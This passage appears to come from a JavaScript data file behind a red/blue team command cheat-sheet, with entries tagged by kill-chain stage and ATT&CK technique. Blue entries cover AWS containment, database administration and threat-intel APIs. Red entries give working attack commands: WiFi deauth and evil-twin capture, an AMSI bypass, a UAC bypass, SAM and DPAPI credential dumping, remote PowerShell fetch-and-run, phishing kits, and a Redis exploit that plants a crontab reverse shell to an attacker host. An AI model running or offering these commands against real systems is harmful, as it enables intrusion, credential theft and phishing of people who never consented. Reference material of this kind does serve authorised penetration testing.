      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'cloud-ir-aws', title: 'AWS IR Containment', team: 'blue', category: 'cloud',
      description: 'Incident response steps for compromised AWS account.',
      tags: ['aws', 'cloud', 'ir', 'containment'], command: '# Disable compromised access key:\naws iam update-access-key --user-name USER --access-key-id AKID --status Inactive\n# Revoke sessions:\naws iam put-role-policy --role-name ROLE --policy-name DenySessions --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*","Condition":{"DateLessThan":{"aws:TokenIssueTime":"NOW"}}}]}\'\n# Check CloudTrail:\naws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=USER --max-items 50',
      killchain: 'actions', attack: ['impact'], pyramid: 'tools', owasp: [] },
    { id: 'cloud-guard-duty', title: 'AWS GuardDuty Check', team: 'blue', category: 'cloud',
      description: 'Check AWS GuardDuty findings for threats.',
      tags: ['aws', 'guardduty', 'cloud'], command: 'aws guardduty list-detectors\nDETECTOR=$(aws guardduty list-detectors --query "DetectorIds[0]" --output text)\naws guardduty list-findings --detector-id $DETECTOR --finding-criteria \'{"Criterion":{"severity":{"Gte":7}}}\'',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'pacu-exploit', title: 'Pacu AWS Exploitation', team: 'red', category: 'cloud',
      description: 'AWS exploitation framework — auto-discover and exploit misconfigs.',
      tags: ['pacu', 'aws', 'cloud', 'exploit'], command: 'pacu\n# In Pacu shell:\nset_keys\nrun iam__enum_permissions\nrun iam__privesc_scan\nrun lambda__enum\nrun ec2__enum',
      killchain: 'exploitation', attack: ['privilege-escalation', 'discovery'], pyramid: 'tools', owasp: ['A01', 'A05'] },

    // ═══════════════════════════════════════════════════════
    //  WIRELESS / WiFi
    // ═══════════════════════════════════════════════════════
    { id: 'airmon-start', title: 'Enable Monitor Mode', team: 'red', category: 'wireless',
      description: 'Put WiFi adapter in monitor mode for sniffing.',
      tags: ['aircrack-ng', 'wifi', 'monitor'], command: 'airmon-ng check kill\nairmon-ng start wlan0',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'airodump', title: 'WiFi Network Scan', team: 'red', category: 'wireless',
      description: 'Scan for nearby wireless networks and clients.',
      tags: ['aircrack-ng', 'wifi', 'scan'], command: 'airodump-ng wlan0mon\n# Target specific channel/BSSID:\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'aireplay-deauth', title: 'WiFi Deauth Attack', team: 'red', category: 'wireless',
      description: 'Force client disconnection to capture WPA handshake.',
      tags: ['aircrack-ng', 'wifi', 'deauth'], command: 'aireplay-ng -0 5 -a BSSID -c CLIENT_MAC wlan0mon\n# Then crack captured handshake:\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'bettercap-wifi', title: 'Bettercap WiFi', team: 'red', category: 'wireless',
      description: 'Swiss army knife for WiFi attacks — deauth, probe, evil twin.',
      tags: ['bettercap', 'wifi'], command: 'bettercap -iface wlan0mon\n# In bettercap:\nwifi.recon on\nwifi.show\nwifi.deauth AA:BB:CC:DD:EE:FF',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'tools', owasp: [] },
    { id: 'wifite', title: 'Wifite Automated WiFi', team: 'red', category: 'wireless',
      description: 'Automated WiFi auditing — WEP/WPA/WPS attacks.',
      tags: ['wifite', 'wifi', 'automated'], command: 'wifite --kill\n# Target specific network:\nwifite -e "TARGET_SSID" -dict /usr/share/wordlists/rockyou.txt',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'tools', owasp: [] },
    { id: 'eaphammer', title: 'EAPHammer Evil Twin', team: 'red', category: 'wireless',
      description: 'Rogue AP for WPA-Enterprise credential capture.',
      tags: ['eaphammer', 'wifi', 'evil-twin'], command: 'eaphammer --bssid AA:BB:CC:DD:EE:FF --essid "CorpWiFi" --channel 6 --interface wlan0 --auth wpa-eap --creds',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'ttps', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  WINDOWS POST-EXPLOITATION
    // ═══════════════════════════════════════════════════════
    { id: 'win-sysinfo', title: 'Windows System Info', team: 'red', category: 'winpost',
      description: 'Gather OS version, patches, network info on Windows target.',
      tags: ['windows', 'enum', 'post-exploitation'], command: 'systeminfo\nwhoami /all\nipconfig /all\nnetstat -ano\nnet user\nnet localgroup administrators',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'win-powerview', title: 'PowerView AD Recon', team: 'red', category: 'winpost',
      description: 'PowerView domain enumeration from compromised Windows host.',
      tags: ['powershell', 'powerview', 'ad'], command: 'IEX(IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)\nGet-Domain\nGet-DomainUser -Identity USER\nGet-DomainGroup -AdminCount\nFind-DomainShare -CheckShareAccess\nInvoke-ShareFinder',
      killchain: 'recon', attack: ['discovery', 'reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'win-rubeus', title: 'Rubeus Kerberos Attacks', team: 'red', category: 'winpost',
      description: 'Kerberos abuse — ticket extraction, roasting, delegation.',
      tags: ['rubeus', 'kerberos', 'windows'], command: '# Kerberoasting:\nRubeus.exe kerberoast /outfile:hashes.txt\n# AS-REP Roasting:\nRubeus.exe asreproast /outfile:asrep.txt\n# Dump TGT:\nRubeus.exe dump /luid:0x3e4 /nowrap',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'tools', owasp: [] },
    { id: 'win-sharphound', title: 'SharpHound Collection', team: 'red', category: 'winpost',
      description: 'BloodHound data collection from Windows (C# native).',
      tags: ['sharphound', 'bloodhound', 'ad', 'windows'], command: '.\\SharpHound.exe -c All --outputdirectory C:\\temp\n# Or via PowerShell:\nIEX(IWR https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1)\nInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'win-token-impersonate', title: 'Token Impersonation', team: 'red', category: 'winpost',
      description: 'Impersonate another user token (requires SeImpersonatePrivilege).',
      tags: ['windows', 'token', 'privesc'], command: '# PrintSpoofer:\nPrintSpoofer.exe -c "C:\\temp\\rev.exe"\n# GodPotato (any Windows):\nGodPotato.exe -cmd "C:\\temp\\rev.exe"\n# JuicyPotato (Win10 < 1809):\nJuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p "C:\\temp\\rev.exe" -t *',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'win-sam-dump', title: 'SAM Database Dump', team: 'red', category: 'winpost',
      description: 'Dump local password hashes from SAM via registry.',
      tags: ['windows', 'sam', 'credentials'], command: 'reg save HKLM\\SAM C:\\temp\\sam\nreg save HKLM\\SYSTEM C:\\temp\\system\n# Then on attacker:\nimpacket-secretsdump -sam sam -system system LOCAL',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },
    { id: 'win-dpapi', title: 'DPAPI Credential Extraction', team: 'red', category: 'winpost',
      description: 'Extract saved credentials protected by DPAPI (browser passwords, WiFi keys).',
      tags: ['mimikatz', 'dpapi', 'windows', 'credentials'], command: 'mimikatz.exe "dpapi::cred /in:C:\\Users\\USER\\AppData\\Local\\Microsoft\\Credentials\\*" "exit"\n# Or with SharpDPAPI:\nSharpDPAPI.exe triage',
      killchain: 'actions', attack: ['credential-access', 'collection'], pyramid: 'tools', owasp: ['A02'] },
    { id: 'win-amsi-bypass', title: 'AMSI Bypass', team: 'red', category: 'winpost',
      description: 'Bypass AntiMalware Scan Interface for PowerShell execution.',
      tags: ['amsi', 'windows', 'evasion', 'powershell'], command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)\n# Then load tools:\nIEX(IWR https://LHOST/PowerView.ps1)',
      killchain: 'exploitation', attack: ['defense-evasion', 'execution'], pyramid: 'ttps', owasp: [] },
    { id: 'win-uac-bypass', title: 'UAC Bypass', team: 'red', category: 'winpost',
      description: 'Bypass User Account Control to get high-integrity shell.',
      tags: ['windows', 'uac', 'privesc'], command: '# fodhelper.exe bypass:\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe /c C:\\temp\\rev.exe" /f\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f\nfodhelper.exe',
      killchain: 'actions', attack: ['privilege-escalation', 'defense-evasion'], pyramid: 'ttps', owasp: ['A01'] },

    // ═══════════════════════════════════════════════════════
    //  SOCIAL ENGINEERING / PHISHING
    // ═══════════════════════════════════════════════════════
    { id: 'gophish', title: 'GoPhish Campaign', team: 'red', category: 'social',
      description: 'Open-source phishing framework — create campaigns, track clicks.',
      tags: ['gophish', 'phishing', 'social'], command: '# Start GoPhish server:\n./gophish\n# Access admin panel: https://127.0.0.1:3333\n# Default: admin/gophish\n# Create: Sending Profile → Email Template → Landing Page → Users → Campaign',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: [] },
    { id: 'setoolkit', title: 'SET Toolkit', team: 'red', category: 'social',
      description: 'Social Engineering Toolkit — credential harvester, phishing, HID attacks.',
      tags: ['setoolkit', 'phishing', 'social'], command: 'setoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack Method\n# 2) Site Cloner → Enter TARGET URL',
      killchain: 'delivery', attack: ['initial-access', 'credential-access'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'evilginx', title: 'Evilginx2 MitM Phish', team: 'red', category: 'social',
      description: 'Reverse proxy phishing — captures session tokens, bypasses MFA.',
      tags: ['evilginx', 'phishing', 'mfa-bypass'], command: 'evilginx2 -p ./phishlets\n# In evilginx:\nphishlets hostname outlook DOMAIN\nphishlets enable outlook\nlures create outlook\nlures get-url 0',
      killchain: 'delivery', attack: ['initial-access', 'credential-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'swaks-email', title: 'Swaks Email Spoof', team: 'red', category: 'social',
      description: 'Send spoofed emails for phishing tests (SMTP testing).',
      tags: ['swaks', 'email', 'spoof', 'social'], command: 'swaks --to victim@DOMAIN --from ceo@DOMAIN --header "Subject: Urgent" --body "Click here: https://LHOST/phish" --server TARGET',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'domains', owasp: [] },
    { id: 'phishing-page', title: 'Credential Harvest Page', team: 'red', category: 'social',
      description: 'Clone a login page for credential harvesting with httrack.',
      tags: ['phishing', 'clone', 'credential-harvest'], command: 'httrack https://TARGET/login -O /tmp/phish_site -v\n# Or quick HTML clone:\ncurl -s https://TARGET/login > index.html\n# Serve: python3 -m http.server 80',
      killchain: 'delivery', attack: ['initial-access', 'credential-access'], pyramid: 'domains', owasp: ['A07'] },
    { id: 'beef-hook', title: 'BeEF Browser Hook', team: 'red', category: 'social',
      description: 'Browser Exploitation Framework — hook browsers via XSS.',
      tags: ['beef', 'xss', 'browser'], command: '# Start BeEF:\nbeef-xss\n# Hook script to inject:\n<script src="https://LHOST:3000/hook.js"></script>\n# Panel: https://LHOST:3000/ui/panel',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'wifi-evil-twin', title: 'Evil Twin WiFi', team: 'red', category: 'social',
      description: 'Create evil twin AP for credential capture.',
      tags: ['wifi', 'evil-twin', 'hostapd'], command: '# Using hostapd-wpe:\nhostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf\n# Or Wifiphisher:\nwifiphisher --essid "Free_WiFi" -p firmware-upgrade',
      killchain: 'delivery', attack: ['initial-access', 'credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'responder-ntlm', title: 'Responder NTLM Capture', team: 'red', category: 'social',
      description: 'Capture NTLM hashes on the network via LLMNR/NBT-NS poisoning.',
      tags: ['responder', 'ntlm', 'poison'], command: 'responder -I eth0 -wFb\n# Hashes saved to /usr/share/responder/logs/',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A07'] },

    // ═══════════════════════════════════════════════════════
    //  DATABASE — PostgreSQL, Redis, Supabase
    // ═══════════════════════════════════════════════════════

    // ── PostgreSQL ──────────────────────────────────────
    { id: 'pg-connect', title: 'PostgreSQL Connect', team: 'blue', category: 'database',
      description: 'Connect to PostgreSQL database and run a quick health check.',
      tags: ['postgresql', 'connect', 'health'], command: 'psql -h HOST -U USER -d DATABASE -c "SELECT version();"\n# Or connection string:\npsql "postgres://USER:PASSWORD@HOST:5432/DATABASE?sslmode=require"',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'pg-list-databases', title: 'PostgreSQL List Databases', team: 'blue', category: 'database',
      description: 'List all databases, sizes, and owners.',
      tags: ['postgresql', 'admin', 'list'], command: 'psql -h HOST -U USER -c "\\l+"\n# Or SQL:\npsql -h HOST -U USER -c "SELECT datname, pg_size_pretty(pg_database_size(datname)) AS size, datdba::regrole AS owner FROM pg_database ORDER BY pg_database_size(datname) DESC;"',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'pg-active-connections', title: 'PG Active Connections', team: 'blue', category: 'database',
      description: 'Show active database connections, queries, and wait events.',
      tags: ['postgresql', 'connections', 'monitoring'], command: 'psql -h HOST -U USER -d DATABASE -c "SELECT pid, usename, client_addr, state, query_start, LEFT(query, 80) AS query FROM pg_stat_activity WHERE state != \'idle\' ORDER BY query_start;"',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'pg-slow-queries', title: 'PG Slow Query Analysis', team: 'blue', category: 'database',
      description: 'Find slow queries using pg_stat_statements.',
      tags: ['postgresql', 'performance', 'slow-query'], command: 'psql -h HOST -U USER -d DATABASE -c "SELECT query, calls, mean_exec_time::numeric(10,2) AS avg_ms, total_exec_time::numeric(10,2) AS total_ms FROM pg_stat_statements ORDER BY mean_exec_time DESC LIMIT 20;"',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'pg-table-sizes', title: 'PG Table Sizes', team: 'blue', category: 'database',
      description: 'Show table sizes including indexes and TOAST data.',
      tags: ['postgresql', 'size', 'tables'], command: 'psql -h HOST -U USER -d DATABASE -c "SELECT schemaname || \'.\' || tablename AS table, pg_size_pretty(pg_total_relation_size(schemaname || \'.\' || tablename)) AS total_size, pg_size_pretty(pg_relation_size(schemaname || \'.\' || tablename)) AS data_size FROM pg_tables WHERE schemaname NOT IN (\'pg_catalog\', \'information_schema\') ORDER BY pg_total_relation_size(schemaname || \'.\' || tablename) DESC LIMIT 20;"',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'pg-user-audit', title: 'PG User & Role Audit', team: 'blue', category: 'database',
      description: 'Audit database users, roles, and privileges for security.',
      tags: ['postgresql', 'users', 'audit', 'security'], command: 'psql -h HOST -U USER -c "SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication FROM pg_roles ORDER BY rolsuper DESC, rolname;"\n# Check table grants:\npsql -h HOST -U USER -d DATABASE -c "SELECT grantee, table_schema, table_name, privilege_type FROM information_schema.table_privileges WHERE grantee != \'postgres\' ORDER BY grantee;"',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'pg-backup-restore', title: 'PG Backup & Restore', team: 'blue', category: 'database',
      description: 'Backup and restore PostgreSQL databases.',
      tags: ['postgresql', 'backup', 'restore'], command: '# Backup (custom format):\npg_dump -h HOST -U USER -Fc DATABASE > backup.dump\n# Backup (plain SQL):\npg_dump -h HOST -U USER DATABASE > backup.sql\n# Restore:\npg_restore -h HOST -U USER -d DATABASE backup.dump\n# All databases:\npg_dumpall -h HOST -U USER > all_databases.sql',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'pg-extensions', title: 'PG Extensions', team: 'blue', category: 'database',
      description: 'List and manage PostgreSQL extensions (pgvector, uuid-ossp, etc.).',
      tags: ['postgresql', 'extensions', 'pgvector'], command: '# List installed:\npsql -h HOST -U USER -d DATABASE -c "SELECT extname, extversion FROM pg_extension ORDER BY extname;"\n# List available:\npsql -h HOST -U USER -d DATABASE -c "SELECT name, default_version FROM pg_available_extensions WHERE installed_version IS NULL ORDER BY name;"\n# Install:\npsql -h HOST -U USER -d DATABASE -c "CREATE EXTENSION IF NOT EXISTS vector; CREATE EXTENSION IF NOT EXISTS "uuid-ossp";"',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'pg-security-hardening', title: 'PG Security Hardening', team: 'blue', category: 'database',
      description: 'Key PostgreSQL security hardening checks.',
      tags: ['postgresql', 'hardening', 'security'], command: '# Check pg_hba.conf for trust auth:\npsql -h HOST -U USER -c "SHOW hba_file;" | xargs grep -v "^#"\n# Check SSL:\npsql -h HOST -U USER -c "SHOW ssl;"\n# Check password encryption:\npsql -h HOST -U USER -c "SHOW password_encryption;"\n# Check log settings:\npsql -h HOST -U USER -c "SHOW log_connections; SHOW log_disconnections; SHOW log_statement;"',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'pg-sqli-enum', title: 'PostgreSQL SQL Injection Enum', team: 'red', category: 'database',
      description: 'Post-exploitation: enumerate PostgreSQL after SQL injection.',
      tags: ['postgresql', 'sqli', 'enum'], command: '# Version:\nSELECT version();\n# Current user:\nSELECT current_user, session_user;\n# List databases:\nSELECT datname FROM pg_database;\n# List tables:\nSELECT table_name FROM information_schema.tables WHERE table_schema=\'public\';\n# Read file (superuser):\nSELECT pg_read_file(\'/etc_passwd\');\n# Command exec (if superuser + pgcrypto):\nCOPY cmd_exec FROM PROGRAM \'id\';',
      killchain: 'exploitation', attack: ['credential-access', 'collection'], pyramid: 'ttps', owasp: ['A03'] },

    // ── Redis ───────────────────────────────────────────
    { id: 'redis-connect', title: 'Redis Connect & Info', team: 'blue', category: 'database',
      description: 'Connect to Redis and get server info.',
      tags: ['redis', 'connect', 'info'], command: 'redis-cli -h HOST -p 6379\n# With auth:\nredis-cli -h HOST -p 6379 -a PASSWORD\n# Quick health:\nredis-cli -h HOST PING\nredis-cli -h HOST INFO server | grep redis_version\nredis-cli -h HOST INFO memory | grep used_memory_human',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'redis-key-scan', title: 'Redis Key Scan', team: 'blue', category: 'database',
      description: 'Scan Redis keys by pattern and check memory usage.',
      tags: ['redis', 'keys', 'scan'], command: '# Scan all keys (safe, non-blocking):\nredis-cli -h HOST SCAN 0 MATCH "*" COUNT 100\n# Pattern match:\nredis-cli -h HOST SCAN 0 MATCH "session:*" COUNT 100\n# Key count:\nredis-cli -h HOST DBSIZE\n# Memory per key:\nredis-cli -h HOST MEMORY USAGE "key_name"',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'redis-monitor', title: 'Redis Live Monitor', team: 'blue', category: 'database',
      description: 'Monitor Redis commands in real-time (use cautiously in production).',
      tags: ['redis', 'monitor', 'debug'], command: '# Live command stream:\nredis-cli -h HOST MONITOR\n# Slow log:\nredis-cli -h HOST SLOWLOG GET 10\n# Client list:\nredis-cli -h HOST CLIENT LIST\n# Memory stats:\nredis-cli -h HOST INFO memory',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'redis-security', title: 'Redis Security Audit', team: 'blue', category: 'database',
      description: 'Check Redis security configuration.',
      tags: ['redis', 'security', 'audit'], command: '# Check if auth required:\nredis-cli -h HOST PING  # Should fail if requirepass set\n# Check dangerous commands:\nredis-cli -h HOST CONFIG GET rename-command\n# Check bind address:\nredis-cli -h HOST CONFIG GET bind\n# Check protected mode:\nredis-cli -h HOST CONFIG GET protected-mode\n# Disable dangerous commands:\nredis-cli -h HOST CONFIG SET rename-command FLUSHALL ""',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'redis-exploit', title: 'Redis Unauthorized Access', team: 'red', category: 'database',
      description: 'Exploit unprotected Redis for RCE via SSH key injection or crontab.',
      tags: ['redis', 'exploit', 'rce'], command: '# Check if open:\nredis-cli -h TARGET PING\n# Write SSH key:\nredis-cli -h TARGET CONFIG SET dir /root/.ssh\nredis-cli -h TARGET CONFIG SET dbfilename authorized_keys\nredis-cli -h TARGET SET sshkey "\\n\\nssh-rsa AAAA...your-key...\\n\\n"\nredis-cli -h TARGET SAVE\n# Or crontab:\nredis-cli -h TARGET CONFIG SET dir /var/spool/cron/crontabs\nredis-cli -h TARGET CONFIG SET dbfilename root\nredis-cli -h TARGET SET cron "\\n*/1 * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1\\n"',
      killchain: 'exploitation', attack: ['execution', 'persistence'], pyramid: 'ttps', owasp: ['A05'] },
    { id: 'redis-flush-cache', title: 'Redis Cache Management', team: 'blue', category: 'database',
      description: 'Manage Redis cache — flush, set TTL, check eviction policy.',
      tags: ['redis', 'cache', 'ttl'], command: '# Flush current DB (careful!):\nredis-cli -h HOST FLUSHDB\n# Set TTL on key:\nredis-cli -h HOST EXPIRE "session:abc123" 3600\n# Check TTL:\nredis-cli -h HOST TTL "session:abc123"\n# Check eviction policy:\nredis-cli -h HOST CONFIG GET maxmemory-policy\n# Set eviction:\nredis-cli -h HOST CONFIG SET maxmemory-policy allkeys-lru',
      killchain: 'actions', attack: ['impact'], pyramid: 'tools', owasp: [] },

    // ── Supabase ────────────────────────────────────────
    { id: 'supabase-status', title: 'Supabase Project Status', team: 'blue', category: 'database',
      description: 'Check Supabase project status and health.',
      tags: ['supabase', 'status', 'health'], command: '# CLI:\nsupabase status\n# API health:\ncurl -s "$SUPABASE_URL/rest/v1/" -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY"\n# Database health:\ncurl -s "$SUPABASE_URL/rest/v1/rpc/ping" -H "apikey: $SUPABASE_ANON_KEY"',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'supabase-db-direct', title: 'Supabase Direct SQL', team: 'blue', category: 'database',
      description: 'Connect to Supabase PostgreSQL directly for admin operations.',
      tags: ['supabase', 'postgresql', 'direct'], command: '# Direct PostgreSQL connection:\npsql "postgres://postgres:PASSWORD@db.PROJECT.supabase.co:5432/postgres"\n# Or via CLI:\nsupabase db remote commit\n# Run migration:\nsupabase migration up\n# Generate types:\nsupabase gen types typescript --project-id PROJECT_ID > types.ts',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'supabase-rls-check', title: 'Supabase RLS Audit', team: 'blue', category: 'database',
      description: 'Audit Row Level Security policies on all tables.',
      tags: ['supabase', 'rls', 'security'], command: '# Check which tables have RLS enabled:\nSELECT schemaname, tablename, rowsecurity FROM pg_tables WHERE schemaname = \'public\';\n# List all RLS policies:\nSELECT schemaname, tablename, policyname, permissive, cmd, qual FROM pg_policies WHERE schemaname = \'public\' ORDER BY tablename;\n# Tables WITHOUT RLS (security risk):\nSELECT tablename FROM pg_tables WHERE schemaname = \'public\' AND rowsecurity = false;',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'supabase-auth-users', title: 'Supabase Auth Users', team: 'blue', category: 'database',
      description: 'List and manage Supabase auth users.',
      tags: ['supabase', 'auth', 'users'], command: '# List users (service role key required):\ncurl -s "$SUPABASE_URL/auth/v1/admin/users" -H "apikey: $SUPABASE_SERVICE_KEY" -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" | jq ".users[] | {id, email, created_at, last_sign_in_at}"\n# Delete user:\ncurl -X DELETE "$SUPABASE_URL/auth/v1/admin/users/USER_ID" -H "apikey: $SUPABASE_SERVICE_KEY" -H "Authorization: Bearer $SUPABASE_SERVICE_KEY"',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'supabase-storage', title: 'Supabase Storage Buckets', team: 'blue', category: 'database',
      description: 'Manage Supabase storage buckets and files.',
      tags: ['supabase', 'storage', 'buckets'], command: '# List buckets:\ncurl -s "$SUPABASE_URL/storage/v1/bucket" -H "apikey: $SUPABASE_SERVICE_KEY" -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" | jq .\n# List files in bucket:\ncurl -s "$SUPABASE_URL/storage/v1/object/list/BUCKET" -H "apikey: $SUPABASE_SERVICE_KEY" -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" -d \'{"prefix":"","limit":100}\' | jq .',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'supabase-edge-functions', title: 'Supabase Edge Functions', team: 'blue', category: 'database',
      description: 'Deploy and manage Supabase Edge Functions.',
      tags: ['supabase', 'edge', 'functions', 'deno'], command: '# List functions:\nsupabase functions list\n# Create new:\nsupabase functions new my-function\n# Deploy:\nsupabase functions deploy my-function\n# Invoke:\ncurl -s "$SUPABASE_URL/functions/v1/my-function" -H "Authorization: Bearer $SUPABASE_ANON_KEY" -d \'{"name":"test"}\'',
      killchain: 'actions', attack: ['execution'], pyramid: 'tools', owasp: [] },
    { id: 'supabase-realtime', title: 'Supabase Realtime Debug', team: 'blue', category: 'database',
      description: 'Debug Supabase Realtime subscriptions and channels.',
      tags: ['supabase', 'realtime', 'websocket'], command: '# Check realtime status:\ncurl -s "$SUPABASE_URL/realtime/v1/api/health" -H "apikey: $SUPABASE_ANON_KEY"\n# Enable realtime on table:\nALTER PUBLICATION supabase_realtime ADD TABLE my_table;\n# Verify publication:\nSELECT * FROM pg_publication_tables WHERE pubname = \'supabase_realtime\';',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  THREAT INTEL / IOC SHARING
    // ═══════════════════════════════════════════════════════
    { id: 'misp-event', title: 'MISP Create Event', team: 'blue', category: 'threatintel',
      description: 'Create a new threat event in MISP with IOCs.',
      tags: ['misp', 'ioc', 'threat-intel'], command: 'curl -XPOST "$MISP_URL/events" -H "Authorization: $MISP_KEY" -H "Content-Type: application/json" -d \'{"Event":{"info":"Phishing campaign - DOMAIN","distribution":"1","threat_level_id":"2","analysis":"1"}}\'',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'misp-add-ioc', title: 'MISP Add IOC Attribute', team: 'blue', category: 'threatintel',
      description: 'Add indicator (IP, hash, domain) to MISP event.',
      tags: ['misp', 'ioc', 'attribute'], command: 'curl -XPOST "$MISP_URL/attributes/add/EVENT_ID" -H "Authorization: $MISP_KEY" -H "Content-Type: application/json" -d \'{"type":"ip-dst","value":"ATTACKER_IP","to_ids":true,"comment":"C2 server"}\'',
      killchain: 'actions', attack: ['collection'], pyramid: 'ips', owasp: [] },
    { id: 'opencti-import', title: 'OpenCTI STIX Import', team: 'blue', category: 'threatintel',
      description: 'Import STIX 2.1 bundle into OpenCTI platform.',
      tags: ['opencti', 'stix', 'import'], command: 'curl -XPOST "$OPENCTI_URL/graphql" -H "Authorization: Bearer $OPENCTI_TOKEN" -H "Content-Type: application/json" -d \'{"query":"mutation { stixBundleImport(input: { content: \\"STIX_BUNDLE_JSON\\" }) { id } }"}\'',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'stix-create', title: 'STIX 2.1 Indicator', team: 'blue', category: 'threatintel',
      description: 'Create a STIX 2.1 indicator object for sharing.',
      tags: ['stix', 'indicator', 'json'], command: '# Python:\nfrom stix2 import Indicator\nindicator = Indicator(\n  name="Malicious IP",\n  pattern="[ipv4-addr:value = \'ATTACKER_IP\']",\n  pattern_type="stix",\n  valid_from="2024-01-01T00:00:00Z"\n)\nprint(indicator.serialize(pretty=True))',
      killchain: 'actions', attack: ['collection'], pyramid: 'ips', owasp: [] },
    { id: 'ioc-check-vt', title: 'Bulk IOC Check (VT)', team: 'blue', category: 'threatintel',
      description: 'Check multiple IOCs against VirusTotal.',
      tags: ['virustotal', 'ioc', 'bulk'], command: 'while read ioc; do echo "=== $ioc ===" && curl -s "https://www.virustotal.com/api/v3/search?query=$ioc" -H "x-apikey: $VT_API_KEY" | jq ".data[0].attributes.last_analysis_stats"; sleep 15; done < iocs.txt',
      killchain: 'actions', attack: ['collection'], pyramid: 'hashes', owasp: [] },
    { id: 'otx-pulse', title: 'AlienVault OTX Pulse', team: 'blue', category: 'threatintel',
      description: 'Fetch threat intel pulse from AlienVault OTX.',
      tags: ['otx', 'alienvalut', 'pulse'], command: 'curl -s "https://otx.alienvault.com/api/v1/indicators/domain/DOMAIN/general" -H "X-OTX-API-KEY: $OTX_KEY" | jq .',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'abuse-ipdb', title: 'AbuseIPDB Check', team: 'blue', category: 'threatintel',
      description: 'Check IP reputation on AbuseIPDB.',
      tags: ['abuseipdb', 'ip', 'reputation'], command: 'curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=ATTACKER_IP&maxAgeInDays=90" -H "Key: $ABUSEIPDB_KEY" -H "Accept: application/json" | jq .data',
